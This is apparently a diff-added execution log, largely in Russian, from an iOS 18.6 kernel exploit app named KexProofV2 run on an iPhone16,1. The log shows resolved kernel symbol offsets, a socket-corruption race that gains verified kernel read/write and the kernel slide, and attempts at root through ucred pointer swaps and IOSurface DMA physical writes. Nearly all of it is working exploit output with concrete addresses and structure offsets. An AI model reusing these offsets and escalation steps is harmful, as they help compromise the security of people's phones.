+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
+
+
+--- Полный журнал ---
+=== запуск KexProofV2 2.0.16 @ 2026-10-06 05:34:45 +0000 ===
+KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов.
+[auto] запускаю эксплойт сам (автостарт)
+=== KexProofV2 2.0.16 — iPhone16,1, Darwin 24.6.0 ===
+iOS 18.6
+
+[Этап 1/4] Патчфайндинг (XPF)
+kernelcache: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/kernelcache
+sptm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/sptm.img4
+txm: /private/var/containers/Bundle/Application/0ABE6383-0777-4CE7-BDF7-6F63E5F064EF/KexProofV2.app/txm.img4
+XPF: kernel загружен, base=0xfffffff007004000 darwin=24.6.0 sptm=–¥–∞ txm=–¥–∞
+[xpf] resolve kernelConstant.kernel_el...
+[xpf] resolve kernelSymbol.start_first_cpu...
+[xpf] resolve kernelSymbol.allproc...
+[xpf] resolve kernelSymbol.kalloc_data_external...
+[xpf] resolve kernelSymbol.fatal_error_fmt...
+[xpf] resolve kernelSymbol.kfree_data_external...
+[xpf] resolve kernelSymbol.SPTMArgs...
+[xpf] resolve kernelSymbol.cpu_ttep...
+[xpf] resolve kernelSymbol.arm_vm_init...
+[xpf] resolve kernelSymbol.gVirtBase...
+[xpf] resolve kernelSymbol.gPhysBase...
+[xpf] resolve kernelSymbol.gPhysSize...
+[xpf] resolve kernelConstant.pointer_mask...
+[xpf] resolve kernelSymbol.pointer_mask...
+[xpf] resolve kernelSymbol.pmap_bootstrap...
+[xpf] resolve kernelConstant.T1SZ_BOOT...
+[xpf] resolve kernelConstant.ARM_TT_L1_INDEX_MASK...
+[xpf] resolve kernelSymbol.txm_trustcache_root...
+[xpf] resolve kernelSymbol.txm_deviceTreeTrustCacheRange...
+[xpf] resolve kernelSymbol.vm_page_array_beginning_addr...
+[xpf] resolve kernelSymbol.vm_page_array_ending_addr...
+[xpf] resolve kernelSymbol.vm_first_phys_ppnum...
+[xpf] resolve kernelSymbol.vm_first_phys...
+[xpf] resolve kernelSymbol.sptm_get_page_table_refcnt...
+[xpf] resolve kernelSymbol.vm_last_phys...
+[xpf] resolve kernelSymbol.pp_attr_table...
+[xpf] resolve kernelSymbol.pmap_enter_pv...
+[xpf] resolve kernelSymbol.pv_head_table...
+[xpf] resolve kernelSymbol.pv_alloc...
+[xpf] resolve kernelSymbol.libsptm_papt_ranges...
+[xpf] resolve kernelSymbol.libsptm_init...
+[xpf] resolve kernelSymbol.wfe_timeout_configure...
+[xpf] resolve kernelSymbol.libsptm_n_papt_ranges...
+[xpf] resolve kernelSymbol.papt_ranges_compressed...
+[xpf] resolve kernelSymbol.papt_ranges_update...
+[xpf] resolve kernelSymbol.n_papt_ranges_compressed...
+[xpf] resolve kernelSymbol.libsptm_frame_table...
+[xpf] resolve kernelSymbol.libsptm_frame_type_params...
+[xpf] resolve kernelStruct.sptm_frame_type_descriptor.struct_size...
+[xpf] resolve kernelStruct.proc.struct_size...
+[xpf] resolve kernelStruct.task.itk_space...
+[xpf] resolve kernelSymbol.task_collect_crash_info...
+[xpf] resolve kernelSymbol.task_crashinfo_release_ref...
+[xpf] resolve kernelStruct.vm_map.pmap...
+[xpf] resolve kernelStruct.IOSurface.ranges...
+[xpf] resolve kernelStruct.IOSurface.IOMemoryDescriptor_withAddressRanges_ref...
+[xpf] resolve kernelStruct.IOSurface.rangeCount...
+[xpf] resolve kernelConstant.nsysent...
+[xpf] resolve kernelSymbol.proc_get_syscall_filter_mask_size...
+[xpf] resolve kernelConstant.mach_trap_count...
+[xpf] resolve kernelSymbol.mach_kobj_count...
+Словарь оффсетов XPF:
+  0x0000000000000060 <- kernelStruct.sptm_frame_type_descriptor.struct_size
+  0xfffffff0270d8bf0 <- kernelSymbol.n_papt_ranges_compressed
+  0xfffffff007b37750 <- kernelSymbol.libsptm_n_papt_ranges
+  0xfffffff007aa2968 <- kernelSymbol.pv_head_table
+  0x0000000000000011 <- kernelConstant.T1SZ_BOOT
+  0xfffffff007b37768 <- kernelSymbol.vm_last_phys
+  0xfffffff007aa29a8 <- kernelSymbol.vm_first_phys_ppnum
+  0xfffffff007aa29b0 <- kernelSymbol.vm_page_array_ending_addr
+  0xfffffff007aa29b8 <- kernelSymbol.vm_page_array_beginning_addr
+  0xfffffff007af4b48 <- kernelSymbol.gPhysBase
+  0xfffffff007aa32b0 <- kernelSymbol.cpu_ttep
+  0xfffffff00802b7f8 <- kernelSymbol.kalloc_data_external
+  0xfffffff007ad9f40 <- kernelSymbol.mach_kobj_count
+  0x00000000000003a4 <- kernelStruct.IOSurface.rangeCount
+  0x0000000000000040 <- kernelStruct.vm_map.pmap
+  0xfffffff007af4b50 <- kernelSymbol.gPhysSize
+  0x0000000000000001 <- kernelConstant.kernel_el
+  0xfffffff027004000 <- kernelConstant.staticSptmBase
+  0xfffffff007004000 <- kernelConstant.staticBase
+  0x000000000000022e <- kernelConstant.nsysent
+  0x0000000000000740 <- kernelStruct.proc.struct_size
+  0xfffffff007b37760 <- kernelSymbol.vm_first_phys
+  0xfffffff017004000 <- kernelConstant.staticTxmBase
+  0x0000000000000080 <- kernelConstant.mach_trap_count
+  0xfffffff007b37790 <- kernelSymbol.libsptm_frame_type_params
+  0xfffffff0270d8c00 <- kernelSymbol.papt_ranges_compressed
+  0xfffffff007b37758 <- kernelSymbol.libsptm_papt_ranges
+  0xfffffff007aa2960 <- kernelSymbol.pp_attr_table
+  0x0000000000000360 <- kernelStruct.IOSurface.ranges
+  0x0000000000000318 <- kernelStruct.task.itk_space
+  0x00007ff000000000 <- kernelConstant.ARM_TT_L1_INDEX_MASK
+  0xfffffff00aaa2608 <- kernelSymbol.allproc
+  0xfffffff007b37788 <- kernelSymbol.libsptm_frame_table
+  0xfffffff017010590 <- kernelSymbol.txm_trustcache_root
+  0xffff800000000000 <- kernelConstant.pointer_mask
+  0xfffffff007ac4c70 <- kernelSymbol.gVirtBase
+  0xfffffff007b36a48 <- kernelSymbol.SPTMArgs
+  0xfffffff00802be88 <- kernelSymbol.kfree_data_external
+gSystemInfo заполнена (динамические + жёстко заданные оффсеты)
+
+[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+machine: iPhone16,1
+hw.cpufamily: 0x2876f5b5
+[KP] engine start: iOS 18.6, iPhone16,1, cpufamily 0x2876f5b5 — offsets: icmp6filt=0x148 chksum=0x150 pcbinfo=0x38 ipi_zone=0x68 zone_elem_size=0x34 itk_space=0x318
+[+] Running on non-A18 device
+[i] low-RAM device (7682MB) — search space scaled to 0xf016 pages (floor 0x8000)
+[i] totalSearchMappingPagesNum: 0xf016
+[i] searchMappingSize: 0x8000000
+[i] totalSearchMappingSize: 0x3c058000
+[i] searchMappingNum: 0x7
+[+] physicalMappingAddress: 0x1012fc000
+[+] pcAddress: 0xf14bd0000
+[+] pe_v1 spray/race cycle 1/6
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[i] socketPortsCount: 22528
+[i] startPcbId: 4 endPcbId: 45058
+[i] looking in search mapping: 0
+[+] pcbStartOffset: 0x400 (filt=0x148 gencnt=0x78)
+[+] targetInpGencnt: 0x1626
+[+] inpListNextPointer: 0xffffffe10a74ffe0
+[+] icmp6Filter: 0xffffffe2dac13480
+[STAGED] stage 1/2 pass — readonly layout validated on-device (filt=0x148 gencnt=0x78), kernel writes measured so far: 0 (BUG.5); corrupting single socket
+[+] alias write (icmp6filt): 0xffffffe10a750128 verified (writeKr=0, attempts=1)
+[+] re-alias (neighbor): 0xffffffe10a750948 verified (writeKr=0, attempts=1)
+[STAGED] re-alias на newer якорь 0xffffffe10a750948: verified
+[+] probe: rw в окне @+0x800 (gencnt=0x1628 → порт #2834, newer якорь) — бинд по окну
+[probe] selftest: getsockopt(control fd=10) через алиас → res=0 len=32 qword0=0xffffffe2dac134a0 (в окне icmp6Filter был 0xffffffe2dac13480)
+[+] probe fds: пара открыта — control idx=2833 fd=10, rw idx=2834 fd=11
+[STAGED] zone window: pcb 0xffffffe10a750400 zone bucket not a kalloc class (raw 0) (qword 0) vs field span 0x160 -> declaring 0x160 bytes (field span (bucket unknown))
+[STAGED] probe (control inp6_chksum at pcb+0x150 = 0xffffffe10a750550): read 0, wrote 0x4141414141414141, read back 0x4141414141414141, restored 0 — krw write+read verified (control-side, clamped)
+[STAGED] probe promoted: icmp6filt corruption KEPT (idx=2833), proven by an inp6_chksum round trip — this socket IS the krw primitive; restore is owned by the caller (run_write_test / staged stage-2 failure path)
+[cleanup] pe_v1: memory object 0x590703 released (kr=0)
+[cleanup] sockets_release: 24576 sprayed socket fileports released
+[cleanup] pe_v1: search mapping 0xda81cc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x6bef90000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x668428000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x4266a0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xc9b0c8000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0x5c0cb0000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: search mapping 0xb4aacc000 munlocked + deallocated (kr=0)
+[cleanup] pe_v1: searchMappings tracker released (0 left, BUG.2)
+[cleanup] spray tracking arrays released (0/0 entries left, BUG.2)
+[+] pe_v1 socket corruption succeeded
+[cleanup] pe_v1: gencnt tracker released (1 entries, BUG.2)
+[+] highestSuccessIdx: 497
+[+] successReadCount: 514
+[SCAN] kernel writes issued this attempt: 2 write(s), 64 byte(s) [measured by kwrite_counter, BUG.5]
+[SCAN]   by route: early_kwrite32bytes=0  early_kwrite64=0  krw_zone_write_block=2  (refused: 0)
+[cleanup] kexploit: free thread stopped + joined (BUG.2)
+[cleanup] kexploit: target fds closed (readFd=8 writeFd=9, BUG.2)
+[+] kernel base scan start: 0xfffffff04bd08000 (zv_name=0xfffffff04bd09d38)
+    scan iter 0 base=0xfffffff04bd04000 val=0x6e6f207369207325
+[STAGED] stage 2/2 pass — krw read chain + kernel magic verified (base=0xfffffff04bc98000 slide=0x44c94000); full chain proceeding
+early_kread64(0xfffffff04bc98000) -> 0x100000cfeedfacf
+win??
+[engine] returning 0 — промоушн и база ядра подтверждены; повторный pe_v1 в этом процессе запрещён
+[+] readFd: 8
+[+] writeFd: 9
+[+] pcObject: 40743
+[+] Corrupting icmp6filter pointer...
+[+] Found control_socket at idx: 2833
+Эксплойт УСПЕШЕН. kernel slide = 0x44c94000, kernel base = 0xfffffff04bc98000
+kreadbuf=0xbd7f80010037806c kwritebuf=0xbb35000100378088 minSafeRead=0x20
+
+[Этап 3/4] Константы загрузки и трансляция адресов
+  gVirtBase: raw=0xfffffff026af0000 strip=0xfffffff026af0000
+  gPhysBase: raw=0x0000010002af0000 strip=0x0000010002af0000
+  gPhysSize: raw=0x00000001e02d8000 strip=0x00000001e02d8000
+  cpu_ttep: raw=0x0000010007ce4000 ttbr-phys=0x0000010007ce4000 va-формой=0x0000010007ce4000
+  EXP-02: DEBG не найден (16 pointees — стабы), перехожу к pointer-vote
+  EXP-02 (формула, без голосования): sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000
+  EXP-02 (формула): txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+  base=0xfffffff04bc98000 virtBase=0xfffffff026af0000 physBase=0x10002af0000 physSize=0x1e02d8000 cpuTTEP=0x10007ce4000 sptmBase=0xfffffff02bc98000 sptmSlide=0x4c94000 txmBase=0xfffffff03bc98000 txmSlide=0x24c94000
+
+[E9 auto] root через ucred swap — сразу после победы, без нажатий
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+
+=== EXP-09: root через подмену указателя p_ucred (heap-only) ===
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.
+Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).
+[E9 auto] uid сейчас: 501 (–Ω–µ root)
+Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции).
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [frame-type census] type=0x11 (pa=0x101aa45c000)
+  [frame-type census] type=0x13 (pa=0x1017f9c8410)
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [frame-type census] type=0x8 (pa=0x10007ce7fe8)
+  [frame-type census] type=0x9 (pa=0x1000974fd10)
+  [frame-type census] type=0x21 (pa=0x1018b9323e8)
+  [frame-type census] type=0xb (pa=0x1000d2e08a0)
+  [frame-type census] type=0xc (pa=0x10007797db8)
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [frame-type census] type=0x15 (pa=0x1000b8dbf40)
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [frame-type census] type=0x6 (pa=0x100057352bc)
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
